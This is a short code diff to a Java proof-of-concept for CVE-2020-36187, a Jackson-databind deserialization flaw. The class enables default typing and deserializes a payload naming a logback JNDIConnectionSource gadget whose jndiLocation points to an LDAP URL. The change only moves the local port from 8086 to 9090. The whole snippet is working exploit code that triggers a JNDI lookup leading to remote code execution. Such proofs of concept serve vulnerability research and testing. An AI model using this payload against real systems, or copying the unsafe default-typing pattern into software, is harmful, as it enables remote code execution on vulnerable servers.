@@ -14,7 +14,7 @@ public class CVE_2020_36187 {
     public static void main(String[] args) throws IOException {
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
-        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:8086/T\"}]";
+        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:9090/T\"}]";
         Object o = mapper.readValue(payload, Object.class);
         mapper.writeValueAsString(o);
     }
